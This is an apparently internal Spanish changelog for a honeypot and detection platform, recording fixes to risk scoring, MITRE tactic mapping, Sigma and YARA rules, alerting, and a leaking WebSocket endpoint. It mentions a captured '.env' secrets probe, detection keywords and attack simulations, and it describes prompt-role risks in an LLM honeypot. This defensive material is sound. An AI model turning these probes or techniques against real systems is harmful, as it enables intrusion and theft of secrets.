**4. La consola.** El panel `#eventDetail` ya existía y solo volcaba el payload; gana una sección
"Por qué este riesgo" con los motivos, sus puntos y el total, más las notas aparte. Si la suma no
cuadra se pinta en rojo (`why-total-mismatch`) en vez de disimularlo. Sin frameworks (regla C3): HTML
y DOM sobre el panel existente.

**5. El mismo riesgo, la misma severidad en todas las pantallas.** `events_router.py:417` tenía su
**propia** `risk_to_severity` con umbrales 70/40 y **sin `critical`**: su máximo era "high". Alimenta
las categorías del Attack Map, así que una categoría de riesgo medio 90 se pintaba "high" mientras el
resto de la consola la llamaba "critical" — exactamente el defecto que la recalibración del 25-ago
quiso eliminar (*"un 80 era high al guardarse pero CRITICAL en los tiles"*), sobrevivido en una
función local. Sustituida por la de `session_scorer`. Un test existente
(`test_graph_attack_map.py::test_risk_to_severity_thresholds`) **fijaba el comportamiento roto**
(`risk_to_severity(85) == "high"`); se actualizó dejando escrito por qué cambió.

**Verificado en vivo:** `/events` devuelve los 4 motivos de un `GET /.env` y suman exactamente su 85;
el correo generado con un evento real de la base muestra el desglose cuadrando; el Attack Map ya
produce `critical`, que era imposible antes; nginx sirve el HTML, JS y CSS con los cambios. Ingesta
sin regresión, invariante en 0, cero trazas. Suite **1179 verde** (+31).

**Ventana de observación cerrada (32 min, 16 muestras):** en las dieciséis, los eventos que devuelve
`/events` traen motivos que suman su puntuación (`api=5ev/0mal`), `descuadrados=0`, `errores_2min=0` y
las reglas de cebo estables en 1 — el guardarraíl de la tanda anterior aguanta. El `ingestion: stale`
intermitente es el comportamiento normal sin tráfico.

- ✅ ~~**PENDIENTE (P3) — descripciones de los factores en inglés**~~ **HECHO (27-ago, Ola D)**: 41
  textos traducidos. Se tradujo lo visible, nunca la clave `factor` (es identificador y el saneado
  agrupa por `f->>'factor'` en SQL).

#### Décima tanda (27-ago-2026) — ✅ **HECHO**: revisión de la UI (3 bugs, personas, vista única)

Primera revisión real de la consola por parte de Iván, con capturas. De sus hallazgos, **tres eran
bugs** y tres eran malentendidos que conviene dejar por escrito para no volver a investigarlos.

**Los tres bugs** (`84b5a99`). El primero tenía una causa que no delataba nada: la regla que oculta
los tabs en el panel central apuntaba a `.view-tabs` y **el contenedor real es `.view-nav`**, así que
nunca casó. Los tabs se veían donde el diseño dice que no aplican, se podían pulsar, y al hacerlo
ocultaban el feed que el central quiere visible; al recargar, `applyViewLevel()` lo restauraba. *Un
selector que no casa con nada no falla: simplemente no hace nada.* Los otros dos: el popover de intel
tenía más `z-index` que el panel de detalle (200 vs 100) y se montaban; y el panel de detalle
—`position: fixed`— sobrevivía a la navegación tapando la vista nueva.

**Lo que NO eran fallos, medido:** el flock de Iván tiene **1 evento**, el disparo de un cebo suyo —
es el arreglo del 26-ago funcionando, **no hay fuga**. El "ruido de IPs" son **dos** direcciones,
ambas de pruebas. El Attack Origin Map está vacío porque **no hay ninguna IP pública** que
geolocalizar (una privada y otra de un rango de documentación). Y los motivos en inglés son los
**1.424 eventos históricos**, que guardaron el texto de antes de traducir.

**Personas** (`b0a610e`, `e0e6aba`). `POST /personalities/{id}/probe` prueba un prompt contra un
comando **sin aplicar ni reiniciar Beelzebub** — antes ese bucle costaba un reinicio. El prompt va
como *system* y el comando del atacante como entrada (al revés, el modelo obedecería al atacante). La
pantalla pasa a explicar qué hace bueno a un prompt, traer un ejemplo real del catálogo y derivar el
identificador del nombre. **Sin clave de LLM el cliente cae a plantilla en silencio**, así que la
respuesta declara siempre `provider`/`is_real` y avisa: ajustar un prompt mirando texto inventado es
peor que un error.

**Vista única** (`1d6fbee`). Fuera las tres pestañas; las 27 secciones en una página por momento de
uso (qué pasa → analizar → infraestructura → trampas) con índice lateral que marca dónde estás
(`IntersectionObserver`, sin librerías). El margen va en `body > section` porque las secciones cuelgan
directas de `body` y no hay contenedor; los modales son `div` y quedan fuera a propósito.

**La sesión SSH, probada de verdad.** Funciona y queda registrada, pero destapó dos cosas:
- `deadlineTimeoutSeconds` era **120 s en SSH y 60 en Telnet** (límite total, no de inactividad) →
  subidos a **600**. Esos ficheros están en `.gitignore` (llevan la clave), así que **el cambio no se
  commitea**: queda anotado aquí.
- **`cd` no cambia de directorio, y no tiene arreglo por prompt.** Comprobado con dos pruebas:
  `cd scripts` + `pwd` sigue en `/home/admin`, y `touch /tmp/x` + `ls /tmp` no ve el fichero.
  **Beelzebub v3.9.0 evalúa cada comando de forma aislada, sin historial de sesión** — y su plugin
  solo acepta `llmProvider`, `llmModel`, `openAISecretKey` y `prompt`, sin opción de memoria. La
  instrucción de estado que se había añadido al prompt **se retiró**: pedirle al modelo algo que no
  puede cumplir gasta tokens y le hace intentar controlar un indicador que pinta Beelzebub. Se dejó
  solo lo viable por-comando.

**Corrección**: el SSH es **Ubuntu 24.04 (`prod-web-01`)**; el Cisco es el **Telnet**. Se dijo al
revés por leer la config del servicio equivocado.

Suite **1348 verde**.

- ⏳ **PENDIENTE nuevo (P2) — el honeypot LLM no mantiene estado de sesión.** Límite de Beelzebub
  v3.9.0, no del prompt. Un atacante que haga `cd` y siga explorando nota que algo va mal. Salidas
  posibles: actualizar Beelzebub si una versión posterior lo soporta, o mantener el estado fuera
  (envolver el plugin). Medido el 27-ago con dos pruebas independientes.

- ⏳ **PENDIENTE nuevo (P3) — quedan de la revisión de UI**: los tiles (cebos, alertas, sensores) no
  dicen de qué flock son; la gráfica de electrocardiograma del flock aporta poco; el error de flock
  duplicado funciona pero es seco; y el Attack Origin Map debería explicar por qué está vacío en vez
  de quedarse mudo. Todos se ven mejor ahora que la vista está unificada.

#### Novena tanda (27-ago-2026) — ✅ **HECHO**: endurecimiento (WebSocket, bcrypt, callback)

Al inventariar lo que quedaba tras cerrar la deuda, **dos pendientes anotados como mejoras de UX o de
despliegue resultaron ser agujeros de seguridad**.

**1. `/ws/events` era una puerta abierta** (`4bc29b9`). Comprobado en vivo: una conexión **sin
credenciales** recibía `source_ip`, protocolo, riesgo y los primeros 200 caracteres del `command` de
los ataques a **cualquier** cliente. Tres cosas lo agravaban:
- `broadcast_event` mandaba todo a todos, sin scope por flock, y el mensaje ni siquiera llevaba
  `flock_id` — tampoco se podía filtrar en el navegador.
- **Activar la autenticación no lo tapaba**: `session_auth_middleware` se registra con
  `BaseHTTPMiddleware` y Starlette **no aplica ese middleware a conexiones WebSocket**. Habría
  quedado abierto igual con `TARTARUS_SESSION_AUTH=true`.
- Nginx enruta `/api/ws/` hacia él, así que era alcanzable desde fuera del contenedor.

Y la UI **ya ni lo usaba**: el Attack Graph se consolidó en el Attack Map y `graph.js` es código
muerto. Una puerta que no servía a nadie y filtraba datos entre clientes. Arreglado: registro
`{conexión → flocks permitidos}`, autenticación **en el endpoint** (donde el middleware no llega) y
cierre con 1008 antes de aceptar. El `flock_id` ya venía resuelto en el evento (`consumer.py:445`):
el dato estaba, faltaba usarlo. **El guardarraíl importa más que el arreglo**: un test falla si
aparece cualquier `@app.websocket` que no autentique — el error de fondo no fue olvidar este
endpoint, fue creer que el middleware llegaba ahí.

**2. Las contraseñas llevaban semanas en SHA-256** (`329c05f`). `bcrypt` estaba en
`requirements.txt` y el código lo prefería, pero **la imagen no lo tenía**: el `pip install` manual de
agosto se perdió al recrear el contenedor. La degradación a SHA-256 + sal es deliberada (no dejar a
nadie fuera del login), pero era **silenciosa**: cero menciones en el log. Imagen reconstruida
(bcrypt 5.0.0), aviso a WARNING si vuelve a faltar —diciendo qué hacer, no solo que algo va mal— y
`password_hash` expuesto en `/health`, porque hasta ahora la única forma de saberlo era entrar al
contenedor. Los hashes viejos siguen valiendo y se migran solos al siguiente login.

**3. El callback de los cebos avisa de ir en claro.** `/canary-tokens/base-url` avisaba de
`localhost` pero no del caso de HTTP a un host de la LAN. El aviso **no** dice «pon HTTPS»: dice la
vía según el escenario y advierte de que un certificado **autofirmado rompería el beacon** (Word y
los EDR rechazan la validación), que sería peor que HTTP. Va en su **propio campo**
(`https_warning`): meterlo en `warning` —como se hizo primero— rompía un test existente y habría
hecho que la consola pintara un aviso nuevo donde no lo esperaba.

**4. `Resource Development`: no se escribió la regla, a propósito.** Es la única táctica de las 14 sin
regla Sigma, pero lo medido dice que escribirla sería cobertura falsa: **cero eventos** con señal, y
lo poco que se ve ya lo cubren tres reglas de `T1105`, que es donde MITRE lo clasifica. Esa táctica
describe lo que el atacante prepara en **su** infraestructura; un honeypot ve el ataque, no la
preparación. Queda un test que deja la ausencia como decisión medida y se cae si cambia la cobertura.

**Ventana de observación cerrada (32 min, 16 muestras):** `password_hash=bcrypt` en las dieciséis —el
rebuild aguanta—, cero avisos de degradación, cero descuadres, cero detecciones sin táctica y cero
trazas. Suite **1320 verde**.

#### Octava tanda (27-ago-2026) — ✅ **HECHO**: cerrar TODA la deuda de la auditoría (5 olas)

Los seis pendientes que fueron dejando las tandas del 25 al 27. Al inventariarlos, **uno estaba ya
resuelto** (`icmp_ping_sweep`) y varios resultaron más baratos o más graves de lo anotado.

**OLA A — taxonomía MITRE** (`af449f6`). De **356 detecciones sin táctica a cero**. `report_model` e
`ioc_extractor` mantenían su propia lista —tres copias del vocabulario, que es lo que dejó colarse la
taxonomía rota— y ahora salen de `mitre_taxonomy`, con las traducciones al español centralizadas.
La lista del informe VRA tenía **dos** diferencias con MITRE: le faltaba `Resource Development` y
ponía `Exfiltration` antes de `Command and Control`. Tres cosas aparecieron al hacerlo, todas del
mismo tipo —el dato estaba, no se leía—:
- el corpus declara la técnica con **tres claves** (`mitre` 119 usos, `mitre_technique` 47,
  `mitre_attack` 20); leer una sola dejaba reglas sin táctica;
- **33 reglas viven en subdirectorios** y tanto el script como *mi propio guardarraíl* usaban `glob`
  en vez de `rglob` — al corregir el test, él mismo destapó 12 técnicas que faltaban en el mapa;
- las detecciones históricas no tenían técnica de la que derivar la táctica, pero **el dato seguía en
  el fichero de su regla** y el `rule_id` dice cuál es: se recuperan de ahí en vez de darlas por
  perdidas.

**OLA B — la evidencia de las reglas rotas** (`d1dd8ea`). Reevaluadas contra la regla de HOY, no
borradas en bloque — y menos mal, porque el resultado es discriminante: `Network Scanning` sobrevive
**entera** (188/188, la reescritura solo la afinó), mientras `SSH Lateral Movement` (222) y
`C2 Beaconing` (175) caen al completo. Lo que las disparaba eran **peticiones HTTP normales**:
`GET / HTTP/1.1` casaba `host` dentro de la cabecera `Host:` y `192.168.` en su valor, así que una
visita web se registraba a la vez como movimiento lateral por SSH y como baliza C2.
**264 conservadas, 685 retiradas.** Para poder reevaluar hubo que cerrar otra segunda puerta: la
vista Sigma la construía el consumer **inline**, con su propio diccionario. Extraída a
`ingest_pipeline.sigma_view_from_payload()`, que acepta el payload como dict **o** como cadena —de la
base sale de las dos formas y equivocarse deja la vista vacía, con lo que *todo* parecería evidencia
falsa y se borraría de más.

**OLA C — cobertura que faltaba** (`9e09eba`). Reglas **MODBUS** (verificadas en vivo con
`attack_modbus.sh`: 7 lecturas → `medium`/Discovery, 3 escrituras → `critical`/Impact con riesgo 90),
**SNMP/NTP** (verificación **sintética**: OpenCanary no está desplegado) y los literales inertes. El
matiz de estos últimos importaba: en `command` la doble barra no puede casar, pero en `payload` **sí
es correcta** (se compara contra el JSON serializado, donde `C:\Windows` es `C:\\Windows`) — un
guardarraíl que no distinguiera habría roto literales que funcionaban.

**OLA D — los motivos en español** (`f596ca4`). 41 textos. Se tradujo lo visible, **nunca** la clave
`factor`: es identificador y el saneado del histórico agrupa por `f->>'factor'` en SQL.

**OLA E — ciclo de vida de los breadcrumbs** (`7f5970a`). Tabla `breadcrumbs` que guarda el
`decoy_hash` (nunca el marcador), listado y baja que retira su regla. Un detalle que los tests
existentes destaparon: pedir el pool por `Depends` hacía que generar un breadcrumb **exigiera** base
de datos, y antes funcionaba sin ella — eso era una regresión, así que el pool se toma de forma
tolerante.

Suite **1292 verde** (+52 sobre las 1240 del inicio de la tanda).

#### Séptima tanda (27-ago-2026) — ✅ **HECHO**: una sola forma de nombrar cada táctica MITRE

El panel de detecciones contaba mal la cobertura, y llevaba haciéndolo desde siempre. De 1.643
detecciones: **644 con la táctica en texto suelto**, **643 con código** y **356 vacías**. No era
cosmético: `discovery` (225) y `TA0007 - Discovery` (87) eran **la misma táctica partida en dos**;
`Persistence` aparecía en cuatro filas distintas, una de ellas con **guion largo** (`–`). Sobre el
corpus vivo, **29 variantes para 13 tácticas** — `Collection` de tres formas, una regla en cada una.

**La culpa no era de las reglas, sino del loader.** `sigma_lite` derivaba la táctica de los *tags*
cuando la regla no la declaraba (`attack.credential_access` → `"credential access"`), y las que sí la
declaraban usaban guiones distintos entre sí. Tres formas de escribir lo mismo, ninguna validada.

**1. El vocabulario, en un sitio** (`engine/engine/mitre_taxonomy.py`): las 14 tácticas Enterprise,
`normalize_tactic()` (traga nombre suelto, código, los dos guiones, forma de tag, y de un campo con
dos tácticas se queda con la primera) y `normalize_technique()` (saca `T1234[.001]` de un texto
libre). La forma canónica **no se inventó**: `risk_engine`, `report_model.tactic_order` e
`ioc_extractor._INTENT_MAP` ya usaban el nombre limpio — por eso `/mitre/heatmap`, que lee de
`events`, siempre salió bien y solo desentonaba `detections`.

**2. El loader normaliza al cargar**: las 29 variantes del corpus colapsaron a **13 tácticas** antes
de escribir una sola detección más.

**3. Saneado** (`scripts/normalize_detection_tactics.py`, dry-run por defecto, respaldo a CSV con
fecha **y hora**): 17 variantes → **10 tácticas**, 1.287 filas. `Discovery` pasó de 225+87 partidas a
**312 juntas**.

**4. Y tirando de ese hilo, tres bugs encadenados en YARA.** Las 356 vacías eran todas suyas:
- `insert_detections` metía `meta["mitre"]` —que contiene **técnicas**— en la columna `mitre_tactic`,
  y dejaba `mitre_technique` siempre vacío.
- Al arreglarlo, seguía sin funcionar: **`YaraEngine.scan()` nunca devolvía `meta`**. El consumidor
  caía en sus valores por defecto, así que TODA detección YARA se guardaba como `high` aunque su
  regla dijera `medium`, y `matched_fields` iba siempre vacío. Nada fallaba: los defaults tapaban el
  agujero.
- Y aun así seguía sin funcionar, porque **el consumer tenía su propia copia del `INSERT`**
  (`consumer.py:499-530`) que la unificación de la ingesta del 26-ago dejó atrás. Como el consumer es
  el camino de Beelzebub —la mayoría del tráfico—, arreglar `insert_detections` no arreglaba nada.
  Ahora delega en la función compartida, y un guardarraíl impide que vuelva a haber dos puertas.

**Verificado en vivo:** las detecciones Sigma nacen con la táctica canónica; las de YARA ya llevan su
técnica (`T1046`, `T1190`), su severidad real (`medium`, no el default) y las cadenas que casaron
(`["$nmap1","$nmap2","$nmap3"]`, solo los identificadores — el contenido puede ser payload de un
atacante). `/detections/stats` sin duplicados; **cero tácticas con dos grafías**. Y `/mitre/heatmap`
**byte a byte idéntico** antes y después, que era la prueba de no romper nada al lado.
Suite **1240 verde** (+61).

- ✅ ~~**PENDIENTE (P2) — táctica de las detecciones YARA vacía**~~ **HECHO (27-ago, Ola A)**: de 356
  a **cero**.

- ✅ ~~**PENDIENTE (P3) — unificar los vocabularios de tácticas**~~ **HECHO (27-ago, Ola A)**. De paso
  se corrigieron dos diferencias del informe VRA con MITRE: le faltaba `Resource Development` y ponía
  `Exfiltration` antes de `Command and Control`.

- ✅ ~~**PENDIENTE (P2) — ciclo de vida de los breadcrumbs**~~ **HECHO (27-ago, Ola E)**: tabla
  `breadcrumbs` (guarda el `decoy_hash`, nunca el marcador), `GET /breadcrumbs` y
  `DELETE /breadcrumbs/{id}` que retira su regla.

- ✅ ~~**PENDIENTE (P2) — detecciones de reglas reescritas por rotas**~~ **HECHO (27-ago, Ola B)**:
  reevaluadas una a una contra la regla de hoy. 264 conservadas, 685 retiradas.

- ✅ ~~**PENDIENTE (P1) — la explicación del riesgo no llega a la consola**~~ **HECHO (27-ago)**, ver
  la sexta tanda más abajo.

- ✅ ~~**PENDIENTE (P3) — taxonomía MITRE inconsistente en `detections`**~~ **HECHO (27-ago)**, ver
  la séptima tanda más abajo.

- ✅ **OLA A — HECHO (26-ago)** Sensores. Suite 1073 verde.
  1. **El sensor ICMP ya no se verifica con una sonda TCP**: `sensor_manager` gana `mode="push"` y el
     ICMP canary se comprueba por su estado en `sensor_registry`. El `:8000` que tenía mapeado era el
     puerto del ENGINE — el contenedor no escucha nada, así que el despliegue SIEMPRE decía "failed".
     Ahora responde `registered`/`already_running` con explicación. `deploy_router` le pasa el pool.
  2. **Bug latente corregido — `offline` perpetuo**: nadie emitía el latido del sensor push, así que el
     worker lo marcaba `offline` aunque estuviera reportando. Ahora `icmpcanary_router` estampa
     `last_heartbeat`/`status='active'` con cada evento (NOW(), no la marca del evento). Verificado en
     vivo: pasó de `offline` a `active`.
  3. **Health worker híbrido**: sondear 5 puertos de ataque cada 30 s abría ~14.400 conexiones/día y era
     la mayor fuente de ruido. Ahora la señal principal son las métricas Prometheus de Beelzebub
     (`:2112`, no honeypot; reusa `BEELZEBUB_METRICS_URL`/`parse_beelzebub_metrics`) y la sonda TCP se
     espacia (`TARTARUS_HEALTH_PROBE_EVERY`, 10 pasadas = 5 min), con caída a sonda si no hay métricas.
     **Medido en vivo: 0 eventos en 100 s (antes ~15).**

- ✅ **OLA B — HECHO (26-ago)** Cebos: que solo avise lo que importa. Suite 1078 verde.
  1. **OpenCanary ya no marca todo como cebo disparado**: nuevo `HIGH_VALUE_LOGTYPES` (login/credencial/
     SMB file open). Una conexión de escaneo (RDP connection, SMB tree connect, HTTP GET) se registra
     igual pero no fuerza correo. Coerción defensiva del `logtype` a int.
  2. **Hueco encontrado al probar**: el escaneo RDP seguía alertando porque la descripción sintética de
     OpenCanary ("RDP connection") pasaba por comando tecleado en `_has_interaction`. Se añadió una
     **señal explícita** `event["interaction"]` que el emisor declara y el notificador respeta.
  3. **Previsualizadores de enlaces**: nuevo `engine/engine/link_previewers.py` (Safe Links, Slack,
     Teams, Mimecast/Proofpoint/Barracuda, curl/requests, buscadores…). Un cebo tocado por un
     previsualizador se **registra como evidencia** con la etiqueta `PREVIEWER_SUSPECTED` pero no manda
     correo; `notifier.should_alert` la respeta. Sin migración de esquema (usa `events.tags`).
  4. **IP real del visitante**: el web-bug tomaba el PRIMER elemento de `X-Forwarded-For` (falsificable
     y, con un proxy previsualizador, la IP equivocada). Ahora prefiere `X-Real-IP` y, si no, el ÚLTIMO
     salto; la cadena completa se guarda como evidencia. Knob `TARTARUS_TRUST_XFF_FIRST` para
     despliegues tipo Cloudflare Tunnel. Se actualizó el test que fijaba la conducta vulnerable.
  Verificado en vivo: escaneo RDP y SMB tree connect → sin correo; FTP login y SMB file open → correo;
  cebo por Slackbot → registrado sin correo; cebo abierto con Word → correo.

- ✅ **OLA C — HECHO (26-ago)** Port-scan y correlación real. Suite 1090 verde.
  1. **Ventana deslizante de verdad**: el detector usaba `SADD` + `EXPIRE` rearmado en cada evento, así
     que bajo tráfico continuo la llave nunca caducaba y un escáner LENTO (1 puerto cada 4 min) acababa
     cruzando el umbral. Migrado a ZSET con score=timestamp + `zremrangebyscore` (patrón de
     `rate_limiter`/`kill_chain_tracer`). Test de expiración real.
  2. **Allowlist de escáner autorizado** (`PORTSCAN_AUTHORIZED_SCANNERS`, IPs o CIDR): un Nessus/Qualys
     corporativo deja la detección como evidencia (nivel `informational`) pero NO sube el riesgo a 75 ni
     notifica. Antes solo había los extremos "descartar el evento" o "silenciar el correo".
  3. **Correlación real** (`engine/engine/correlation_engine.py`): `sigma_lite` ahora CONSERVA los
     metadatos (`type`/`group-by`/`timespan`/`gte`, con parser de "5m"/"30s") en vez de descartarlos, y
     las reglas de umbral se evalúan en el bucle async del consumer (donde hay Redis), con ZSET por
     grupo y candado NX de "una vez por ventana". `evaluate(..., allow_correlation=True)` separa el
     match del patrón de la decisión por ventana.
  4. **Regla `ssh_brute_force` corregida**: pedía `command contains 'Failed password'`, pero Beelzebub
     **acepta todos los accesos por diseño** y nunca emite eso → la regla no podía casar jamás (mismo
     tipo de desajuste que `icmp_ping_sweep` con 'Echo request'). Ahora casa `New SSH Login Attempt`,
     que es la señal real; la repetición la cuenta la correlación.
  **Verificado en vivo**: 1 intento SSH → sin detección; 6 intentos → UNA sola detección
  ("5 eventos de 192.168.97.1 en 300s (umbral 5)").

- 🔴 **HALLAZGO OPERATIVO (26-ago) — la ingesta del honeypot estaba MUERTA.** Al probar salió que
  Beelzebub llevaba desde el 25-ago 23:30 sin publicar a RabbitMQ:
  `Exception (504) "channel/connection is not open"`. Beelzebub (Go) **no reconecta** su publicador; el
  consumer del engine sí se auto-recupera, por eso la cola aparecía "sana" (0 mensajes, 1 consumidor)
  mientras no entraba nada. Los eventos de hoy que sí se veían entraban por los webhooks
  (OpenCanary/canary), no por la cola. Se restauró reiniciando Beelzebub. **Para esto existe
  `scripts/beelzebub_watchdog.sh` (sondea /health y reinicia con cooldown) pero NO está corriendo en el
  host** → pendiente: dejarlo activo (launchd/cron) o el honeypot se queda mudo sin avisar. El
  `/health` sí lo delata (`ingestion: stale`).
  ✅ **RESUELTO (26-ago)**: la causa de que el watchdog no corriera es que
  `scripts/beelzebub_watchdog.sh` **nunca tuvo permiso de ejecución** (`-rw-r--r--`) — por eso nadie lo
  había lanzado nunca. Se hizo ejecutable y se instaló como agente de launchd:
  `~/Library/LaunchAgents/com.tartarus.beelzebub-watchdog.plist` (cada 60 s, `RunAtLoad`, PATH explícito
  porque launchd no trae `docker`/`python3`, log en `/tmp/tartarus-watchdog.log`). **Probado de verdad**:
  se simuló la ingesta muerta y el watchdog detectó el `stale` y reinició Beelzebub; la ingesta volvió a
  `ok` en segundos. Sobrevive a reinicios de la Mac. Para desactivarlo:
  `launchctl bootout gui/$(id -u)/com.tartarus.beelzebub-watchdog`.

- ✅ ~~**PENDIENTE menor de la Ola C**: `icmp_ping_sweep` no puede disparar~~ **ANOTACIÓN OBSOLETA**,
  cerrada el 27-ago. Se resolvió el 26-ago (la regla acepta `echo_request` y el ingest ICMP ejecuta
  `analyze()`) y nadie actualizó la nota. Confirmado en vivo: tres pings en menos de 30 s producen
  **una sola** detección de barrido, con táctica `Discovery`.

Plan aceptado en `~/.claude/plans/si-sigue-hazlo-a-refactored-rivest.md`. Decisiones: por olas · filtrar
Sigma por aplicabilidad · alertar solo con interacción real.

- ✅ **OLA 1 — HECHO (25-ago)** (detener el flood + FP estructurales). Suite 1058 verde.
  1. `notifier.should_alert`: las **fases MITRE peligrosas** (SMB/RDP/FTP/Telnet/SSH-login) ya NO saltan el
     umbral por sí solas — requieren **interacción real** (comando/credencial/payload) o `risk>=umbral`.
     Era el mayor generador de correos. Helper `_has_interaction`.
  2. **Tope global/hora por flock** (`NOTIFY_MAX_PER_HOUR`, default 200, `alert_count:{flock}:{hh}` en
     Redis) + `NOTIFY_RATE_LIMIT_SECONDS` configurable (antes 300 hardcodeado).
  3. **Prioridad honey-cred**: un honey-cred ya no queda suprimido por una alerta trivial de la misma IP
     (bug de sub-alerta). Canary conserva su dedup por token.
  4. **Filtro de infra en TODOS los webhooks** (antes solo en el consumer de RabbitMQ): opencanary, icmp,
     ingest, canary(webhook+webbug). Lógica movida a `engine/engine/infra_filter.py` (reusable).
  5. Sigma `sigma_lite`: bloque de detección **vacío/None** ahora cuenta como False (antes NameError →
     fallback `any()` que anulaba los `and not <filtro>` → FP masivos, p.ej. T1021_004_ssh_lateral).
  6. Sigma: reglas con `correlation`/`timeframe` (`event_count gte:N`) NO se evalúan por-evento (7 reglas;
     antes ssh_brute_force/icmp_ping_sweep disparaban con 1 evento). smart_correlator hace la real.
  7. Deprecada `tartarus/icmp_tunnel_exfil.yml` (circular: TODO ICMP → high, no medía el tamaño).

- ✅ **OLA 2 — HECHO (25-ago)** (limpieza del corpus Sigma). Reglas cargadas: **669 → 366** (7 deprecadas
  + 304 no aplicables); el log del engine lo dice explícitamente (no hay recorte silencioso).
  1. **Aplicabilidad**: `sigma_lite` solo carga reglas cuyos campos ⊆ `HONEYPOT_EVENT_FIELDS`. Las de
     endpoint/EDR (`CommandLine` 305 usos, `Image` 252, `EventID` 124) no se evalúan: no podían casar de
     forma significativa contra los 14 campos del evento. Override: `TARTARUS_SIGMA_ALL_RULES=true`.
  2. **BUG del motor (encontrado al probar)**: `_eval_block` pasaba el patrón del modificador `re` por
     `.lower()`, lo que convertía `\S`→`\s` (y `\D`→`\d`, `\W`→`\w`, `\B`→`\b`) y **rompía en silencio
     toda regex con clases negadas**. Ahora `re` conserva el patrón tal cual.
  3. **Deprecadas** (fire-on-protocol, redundantes con el bonus del risk_engine):
     `T1021_001_rdp_lateral`, `T1021_002_smb_lateral`.
  4. **Recalibradas a `medium`** (miraban solo el protocolo → disparaban con un handshake y floreaban a
     70 = correo): `tartarus/rdp_connection`, `smb_enumeration_v2`, `telnet_brute_force`,
     `ftp_credential_access`.
  5. **Tightening por substring** (regex con límite de palabra en vez de `contains`): `T1071` (`host`,
     `dig`), `T1548` (`sudo`), `T1087` (`id`, `groups`), `mysql_injection` (`--`), `ftp_anonymous`
     (`ftp`), `rdp_nla_bypass` (`NLA` sobre el JSON crudo).
  Verificado E2E: conexiones peladas (RDP/SMB/TELNET/FTP/TCP) topan en **medium**; ataques reales (SQLi,
  path traversal, shell upload) siguen en **85/critical**; 0 disparos de reglas deprecadas.

- ✅ **OLA 3 — HECHO (25-ago)** salvo la limpieza de datos (ver abajo). Unificación total a 85/70/40:
  1. **Backend**: `session_correlator.attack_summary` (la tira PRINCIPAL del dashboard, que era el sitio
     más visible y seguía en 80/60/30), `pdf_report`, `thehive_dispatcher`, `report_router`,
     `recommendations_engine`, `report_model`, `notifier` (corte medium 30→40).
  2. **Texto que ve el operador**: `translations.py` documentaba la escala VIEJA ("≥80 Crítico, 60-79
     Alto") y las etiquetas de leyenda del reporte (`engagement_report.html`) decían "Critical (≥80)".
     Ahora ≥85 / 70-84 / 40-69.
  3. **Frontend**: constantes únicas `window.RISK_CRITICAL/HIGH/MEDIUM` en `main.js`; badge del feed,
     color de tarjeta de atacante, badge del historial de notificaciones y `timeline.js` las usan.
  4. **KPI central `ckCrit`**: pasaba `min_risk=80` y **sin ventana** (all-time) → mismo patrón "número
     histórico enorme junto a paneles vacíos". Ahora `min_risk=85` + `hours=24`.
  5. **Flock summary**: `high_risk >= 70` incluía a los critical (se solapaban); acotado a 70-84.
  6. **Embudo de ingesta**: el filtro de infra descartaba ANTES del contador, así que sus descartes se
     veían como "pérdida" fuente→persistido. Nueva etapa `infra_filtered` (contador
     `consumer:events_infra_filtered`) y se descuenta de la brecha.
  **Guardarraíl nuevo**: `test_severity_thresholds_consistency.py` falla si reaparece un corte 80/60/30 en
  el engine o un literal de umbral suelto en el front. Verificado en vivo: attack-summary (3+2+3+0=8) ==
  stats `total_events: 8` en la misma ventana. Suite **1066 verde**.

- ✅ ~~**PENDIENTE (acción de Iván) — limpieza de datos**~~ **HECHO (26-ago)**. Plan en
  `wiki/planes/2026-08-26.md` (segunda entrada). Resultado medido:

  | | Antes | Después |
  |---|---|---|
  | Eventos | 3720 | **1389** |
  | Detecciones | 15978 | **6679** |
  | Eventos con IP de contenedor | 2328 | **0** |
  | Gateway `.1` (simulaciones reales) | 1389 | **1389** (intacto) |

  1. **Respaldo primero** (no existía ninguna convención en el repo): `pg_dump` comprimido a
     `backups/db/tartarus_YYYYMMDD_HHMM.sql.gz`, verificado (1.2 MB, 3720 filas de eventos) ANTES de
     borrar. El procedimiento de **restauración** quedó escrito en la cabecera de
     `scripts/purge_infra_noise.sh` — antes no estaba documentado en ninguna parte. `backups/` ya estaba
     en `.gitignore` (un volcado lleva datos de clientes).
  2. **Script reforzado**: solo cubría las dos FK reales (`detections`, `mitre_evidence`) y dejaba
     colgando los **arrays sin FK**. Ahora limpia, en la misma transacción, `kill_chain_traces.event_ids`
     y `activity_clusters.event_ids` (quita los ids borrados y elimina la fila si queda vacía),
     `correlation_sessions` (agrega por IP) y borra `mitre_evidence` ANTES que `detections` (su FK
     `detection_id` podía abortar la transacción entera con otros datos).
  3. **Validado con ROLLBACK** antes de aplicar: la simulación dio exactamente los números previstos.
  4. Purga aplicada: 2328 eventos, 9297 detecciones, 1 traza de kill-chain (resultó estar hecha SOLO de
     ruido, así que se eliminó entera).
  5. `AUDIT_A`/`AUDIT_B` borrados vía `DELETE /flocks/{id}` (estaban vacíos: el re-hospedaje al Default
     que hace ese endpoint no movió nada). Quedan `Default Flock` e `Iván`.
  6. Borrados también los 3 eventos sintéticos de las pruebas de hoy (rangos RFC 5737).
  7. **Contadores reconciliados**: `consumer:events_total` (−2331) y `consumer:events_by_proto:*`
     ajustados a la BD. Sin esto, el embudo comparaba 3710 ingeridos contra 1389 persistidos y cantaba
     una **pérdida de escritura falsa del 62,6 %**; ahora reporta **0,0 %**.
  8. Limpiado además 1 id colgante **heredado** en una traza del 10-ago (residuo previo, no de esta purga).
  Verificado: 0 huérfanos, 0 detecciones sin evento, suite 1090 verde, UI y `/health` ok.

- 🔴 **CORREGIDO (26-ago, al tercer intento) — el watchdog reiniciaba Beelzebub en bucle.**
  Historial honesto de los tres intentos, porque las dos primeras versiones parecían correctas y no lo
  eran: **(v1)** reiniciaba con solo ver la ingesta `stale` → en un laboratorio sin ataques ese es el
  estado normal, así que reinició cada 5 min. **(v2)** intentó deducir la avería comparando el contador de
  Beelzebub con el de la ingesta → **166 reinicios en ~14 h**: al reiniciar, los contadores de Beelzebub
  vuelven a CERO y las sondas de salud los suben otra vez (y esas sondas se descartan a propósito en la
  ingesta), lo que se leía como "produce pero no llega". Dos contadores asíncronos no son un
  discriminador fiable. **(v3, la buena)** se busca la **firma directa del fallo** en el log del propio
  Beelzebub: `channel/connection is not open`, que escribe por cada evento que no puede publicar. Se
  exige `stale` **y** esa firma. Medido: 106 errores durante la avería real, 0 con el sistema sano.
  **Probado induciendo la avería de verdad** (reiniciar el broker rompe el canal): el watchdog la detectó,
